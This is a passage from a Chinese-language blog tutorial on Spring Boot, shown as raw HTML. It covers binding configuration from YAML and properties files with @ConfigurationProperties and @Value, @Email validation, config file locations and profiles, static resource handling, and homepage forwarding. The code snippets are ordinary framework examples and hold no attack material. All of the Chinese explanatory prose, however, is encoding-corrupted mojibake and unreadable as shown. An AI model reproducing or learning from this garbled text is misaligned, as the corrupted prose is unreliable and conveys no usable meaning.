<span class="token class-name">Object</span><span class="token punctuation">></span></span> maps<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>maps <span class="token operator">=</span> maps<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">getLists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> lists<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLists</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> lists<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lists <span class="token operator">=</span> lists<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span> <span class="token function">getCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCat</span><span class="token punctuation">(</span><span class="token class-name">Cat</span> cat<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cat <span class="token operator">=</span> cat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Person&#123;"</span> <span class="token operator">+</span>                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>                <span class="token string">", happy="</span> <span class="token operator">+</span> happy <span class="token operator">+</span>                <span class="token string">", birth="</span> <span class="token operator">+</span> birth <span class="token operator">+</span>                <span class="token string">", maps="</span> <span class="token operator">+</span> maps <span class="token operator">+</span>                <span class="token string">", lists="</span> <span class="token operator">+</span> lists <span class="token operator">+</span>                <span class="token string">", cat="</span> <span class="token operator">+</span> cat <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå¯ä»¥åœ¨Catç±»é‡Œé¢æ·»åŠ <code>@Value</code>æ³¨è§£æ¥èµ‹å€¼ï¼Œéœ€è¦ä¸€ä¸ªä¸ªå±æ€§æŒ‡å®šæ¥è¿›è¡Œèµ‹å€¼</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708190439958.png" alt="image-20240708190439958"></p><hr><h3 id="Yamlé…ç½®æ–‡ä»¶ç»‘å®š"><a href="#Yamlé…ç½®æ–‡ä»¶ç»‘å®š" class="headerlink" title="Yamlé…ç½®æ–‡ä»¶ç»‘å®š"></a>Yamlé…ç½®æ–‡ä»¶ç»‘å®š</h3><p>åœ¨resourcesæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºapplication.yamlï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">person</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> 0w0  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">happy</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">birth</span><span class="token punctuation">:</span> 2024/07/09  <span class="token key atrule">maps</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token key atrule">k1</span><span class="token punctuation">:</span> v1<span class="token punctuation">,</span><span class="token key atrule">k2</span><span class="token punctuation">:</span> v2<span class="token punctuation">&#125;</span>  <span class="token key atrule">lists</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> code    <span class="token punctuation">-</span> game    <span class="token punctuation">-</span> music  <span class="token key atrule">cat</span><span class="token punctuation">:</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> kitty    <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶ååœ¨Person.javaä¸­æ·»åŠ <code>@ConfigurationProperties(prefix = &quot;person&quot;)</code>æ³¨è§£æŠŠyamlé…ç½®æ–‡ä»¶ç»‘å®šä¸Šå»</p><blockquote><p>@ConfigurationPropertiesï¼šå°†é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„æ¯ä¸€ä¸ªå±æ€§çš„å€¼ï¼Œæ˜ å°„åˆ°è¿™ä¸ªç»„ä»¶ä¸­ï¼›å‚æ•°<code>prefix</code>å°†é…ç½®æ–‡ä»¶ä¸­çš„æ‰€æœ‰å±æ€§è¿›è¡Œä¸€ä¸€å¯¹åº”</p></blockquote><p>å’Œ<code>@Value</code>çš„åŒºåˆ«ï¼š</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709004523248.png" alt="image-20240709004523248"></p><blockquote><p>æ¾æ•£ç»‘å®šï¼šyamlä¸­<code>last-name</code>å’Œ<code>lastName</code>æ˜¯ä¸€æ ·çš„ï¼Œ<code>-</code>åè·Ÿç€çš„å­—æ¯é»˜è®¤æ˜¯å¤§å†™çš„</p></blockquote><p>å®ä¾‹ï¼š</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709002814400.png" alt="image-20240709002814400"></p><p>æ¥ä¸‹æ¥ç”¨testæ–‡ä»¶å¤¹ä¸‹çš„DemoApplicationTestsè¿›è¡Œæµ‹è¯•æ‰“å°ï¼Œä½¿ç”¨<code>@Autowired</code>æ³¨è§£ï¼Œå³è‡ªåŠ¨è£…é…</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709002908085.png" alt="image-20240709002908085"></p><p>æˆåŠŸæ‰“å°å‡ºæ¥</p><p>æ³¨æ„ï¼šyamlé…ç½®æ–‡ä»¶å¯ä»¥æ’å…¥<strong>elè¡¨è¾¾å¼</strong></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709004217315.png" alt="image-20240709004217315"></p><hr><h3 id="Propertiesé…ç½®æ–‡ä»¶ç»‘å®š"><a href="#Propertiesé…ç½®æ–‡ä»¶ç»‘å®š" class="headerlink" title="Propertiesé…ç½®æ–‡ä»¶ç»‘å®š"></a>Propertiesé…ç½®æ–‡ä»¶ç»‘å®š</h3><p>è¿™ç§æ–¹å¼å’Œyamlå·®ä¸å¤šï¼Œéƒ½æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶è¿›è¡ŒæŒ‡å®š</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">name</span><span class="token punctuation">=</span><span class="token value attr-value">0w0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Person.javaä½¿ç”¨<code>@PropertySource</code>æ³¨è§£æ¥åŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶</p><p>ç„¶åç”¨<code>@Value(&quot;$&#123;name&#125;&quot;)</code>è¿™ä¸ªSPELè¡¨è¾¾å¼æ¥å–å‡ºé…ç½®æ–‡ä»¶çš„å€¼</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709003745075.png" alt="image-20240709003745075"></p><hr><h2 id="JSR303æ ¡éªŒ"><a href="#JSR303æ ¡éªŒ" class="headerlink" title="JSR303æ ¡éªŒ"></a>JSR303æ ¡éªŒ</h2><blockquote><p>åœ¨å­—æ®µä¸­å¢åŠ ä¸€å±‚è¿‡æ»¤å™¨éªŒè¯ï¼Œä¿è¯æ•°æ®çš„åˆæ³•æ€§</p></blockquote><p>SpringBootä¸­ç”¨<code>@Validated</code>æ¥æ ¡éªŒæ•°æ®ï¼Œå¦‚æœæ•°æ®å¼‚å¸¸åˆ™ä¼šç»Ÿä¸€æŠ›å‡ºå¼‚å¸¸ï¼Œæ–¹ä¾¿å¼‚å¸¸ä¸­å¿ƒç»Ÿä¸€å¤„ç†</p><p>å¼•å…¥ä¾èµ–ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>jakarta.validation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jakarta.validation-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>tipsï¼šå¦‚æœå®‰è£…ä¾èµ–å‡ºç°<code>connect timeout</code>çš„å»ºè®®ç›´æ¥åœ¨mavenä¸‹çš„conf&#x2F;setting.xmlé‡Œæ·»åŠ ä»£ç†ï¼Œå‚è€ƒï¼š<a href="https://www.feiyiblog.com/2021/07/09/maven%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/">https://www.feiyiblog.com/2021/07/09/maven%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</a></p></blockquote><p>è¿™é‡Œå†™ä¸€ä¸ªæ³¨è§£è®©nameåªèƒ½æ”¯æŒEmailæ ¼å¼ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"person"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Validated</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Email</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬ç»§ç»­ä¼ å…¥å‰é¢çš„nameæ—¶å°±ä¼šæŠ¥é”™</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709163549439.png" alt="image-20240709163549439"></p><p>è·Ÿè¿›ä¸€ä¸‹<code>@Email</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>constraints</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Constraint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Payload</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Repeatable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Constraint</span><span class="token punctuation">(</span>    validatedBy <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Repeatable</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Email</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">"&#123;jakarta.validation.constraints.Email.message&#125;"</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">groups</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Payload</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">regexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">".*"</span><span class="token punctuation">;</span>    <span class="token class-name">Pattern<span class="token punctuation">.</span>Flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Documented</span>    <span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">List</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Email</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¯¹åº”çš„å¤„ç†é€»è¾‘ï¼Œ<code>@Email(message=&quot;xxx&quot;)</code>ä¿®æ”¹messageçš„å€¼å¯ä»¥æ”¹å˜æŠ¥é”™è¿”å›çš„ä¿¡æ¯</p><p>ä¸€äº›å†…åµŒçš„çº¦æŸæ³¨è§£ï¼š</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709012524213.png" alt="image-20240709012524213"></p><hr><h2 id="å¤šç¯å¢ƒé…ç½®å’Œé…ç½®æ–‡ä»¶ä½ç½®"><a href="#å¤šç¯å¢ƒé…ç½®å’Œé…ç½®æ–‡ä»¶ä½ç½®" class="headerlink" title="å¤šç¯å¢ƒé…ç½®å’Œé…ç½®æ–‡ä»¶ä½ç½®"></a>å¤šç¯å¢ƒé…ç½®å’Œé…ç½®æ–‡ä»¶ä½ç½®</h2><p>SpringBootä¸­æœ‰å››ä¸ªåœ°æ–¹å¯ä»¥å­˜æ”¾æˆ‘ä»¬çš„application.yamlï¼ˆæˆ–.propertiesï¼‰é…ç½®æ–‡ä»¶ï¼ˆæœ€æ–°ç‰ˆè²Œä¼¼æœ‰äº”ä¸ªï¼‰ï¼Œä¼˜å…ˆçº§å¦‚ä¸‹ï¼š</p><ol><li><p>é¡¹ç›®åŒçº§ç›®å½•çš„configç›®å½•ä¸‹ï¼š<code>file:./config/</code></p></li><li><p>é¡¹ç›®åŒçº§ç›®å½•ï¼š<code>file:./</code></p></li><li><p>resourceçš„configç›®å½•ä¸‹ï¼š<code>classpath:./config/</code></p></li><li><p>resourceç›®å½•ä¸‹ï¼ˆé»˜è®¤ï¼‰ï¼š<code>classpath:./</code></p></li></ol><p>å¯ä»¥é€šè¿‡æŒ‡å®š<code>spring.profiles.active</code>æ¥é€‰æ‹©ç¯å¢ƒï¼Œé…ç½®æ–‡ä»¶åä¸º<code>application-xxx.yml(properties)</code>ï¼ˆxxxè¡¨ç¤ºä¸åŒç¯å¢ƒï¼Œå¦‚testâ€”â€”æµ‹è¯•ç¯å¢ƒï¼Œdevâ€”â€”å¼€å‘ç¯å¢ƒï¼‰ï¼Œè¿™æ ·å­æˆ‘ä»¬åªéœ€è¦åœ¨<code>application.yml(properties)</code>ä¸­æŒ‡å®š<code>spring.profiles.active</code>çš„å€¼å°±å¯ä»¥åº”ç”¨å¯¹åº”çš„é…ç½®ï¼š</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.profiles.active</span><span class="token punctuation">=</span><span class="token value attr-value">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>    <span class="token key atrule">active</span><span class="token punctuation">:</span> test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="Webå¼€å‘"><a href="#Webå¼€å‘" class="headerlink" title="Webå¼€å‘"></a>Webå¼€å‘</h2><h3 id="é™æ€èµ„æºå¯¼å…¥"><a href="#é™æ€èµ„æºå¯¼å…¥" class="headerlink" title="é™æ€èµ„æºå¯¼å…¥"></a>é™æ€èµ„æºå¯¼å…¥</h3><ul><li>webé¡¹ç›®ä¸­resourceç›®å½•ä¸‹</li><li>é¡¹ç›®ä¸­çš„resource&#x2F;resourceç›®å½•ä¸‹</li><li>é¡¹ç›®ä¸­çš„resource&#x2F;staticç›®å½•ä¸‹</li><li>é¡¹ç›®ä¸­çš„resource&#x2F;publicç›®å½•ä¸‹</li></ul><p>ä¼˜å…ˆçº§ï¼šresource&gt;staticï¼ˆé»˜è®¤ï¼‰&gt;public</p><p>è¿˜æœ‰ä¸€ä¸ªwebjarsçš„è·¯å¾„ï¼šwebjars&#x2F;jquery&#x2F;3.5.1&#x2F;jquery.js</p><blockquote><p>tipsï¼šIDEAä¸­ctrl+shift+aå¯ä»¥å…¨å±€æœç´¢</p></blockquote><p>æºç åˆ†æï¼šå‚è€ƒ<a href="https://blog.csdn.net/qq_43466788/article/details/108905644">https://blog.csdn.net/qq_43466788/article/details/108905644</a></p><p>WebMvcAutoConfiguration.classï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°<code>addResourceHandlers</code>æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>resourceProperties<span class="token punctuation">.</span><span class="token function">isAddMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Default resource handling disabled"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mvcProperties<span class="token punctuation">.</span><span class="token function">getWebjarsPathPattern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"classpath:/META-INF/resources/webjars/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mvcProperties<span class="token punctuation">.</span><span class="token function">getStaticPathPattern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>registration<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            registration<span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resourceProperties<span class="token punctuation">.</span><span class="token function">getStaticLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletContext <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">ServletContextResource</span> resource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletContextResource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletContext<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                registration<span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Resource</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªå®¡è®¡ä»£ç ï¼Œæœ‰æ—¶é—´äº†å†å®¡ï¼ˆ</p><hr><h3 id="é¦–é¡µè®¾ç½®"><a href="#é¦–é¡µè®¾ç½®" class="headerlink" title="é¦–é¡µè®¾ç½®"></a>é¦–é¡µè®¾ç½®</h3><p>æŠŠindex.htmlæ”¾åœ¨templatesç›®å½•æˆ–è€…staticæ–‡ä»¶å¤¹ä¸‹ï¼Œstaticæ²¡æœ‰å°±å›å»templatesæ‰¾</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709174338230.png" alt="image-20240709174338230"></p><p>ä½¿ç”¨éindex.htmlçš„æ–‡ä»¶ä½œä¸ºé¦–é¡µï¼Œè¿™é‡Œä»¥login.htmlä¸ºä¾‹ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li><p>è‡ªå®šä¹‰ä¸€ä¸ªControllerè¿›è¡Œè½¬å‘ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"forward:login.html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è‡ªå®šä¹‰ä¸€ä¸ª MVC é…ç½®ï¼Œå¹¶é‡å†™<code>addViewControllers</code>æ–¹æ³•è¿›è¡Œè½¬å‘</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebMvcConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addViewControllers</span><span class="token punctuation">(</span><span class="token class-name">ViewControllerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        registry<span class="token punctuation">.</span><span class="token function">addViewController</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span><span class="token string">"forward:login.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>æ›´å¤šæ–¹æ³•ç§»æ­¥ï¼š<a href="https://www.hangge.com/blog/cache/detail_2528.html">https://www.hangge.com/blog/cache/detail_2528.html</a></p><hr><h3 id="Thymeleafæ¨¡æ¿å¼•æ“"><a href="#Thymeleafæ¨¡æ¿å¼•æ“" class="headerlink" 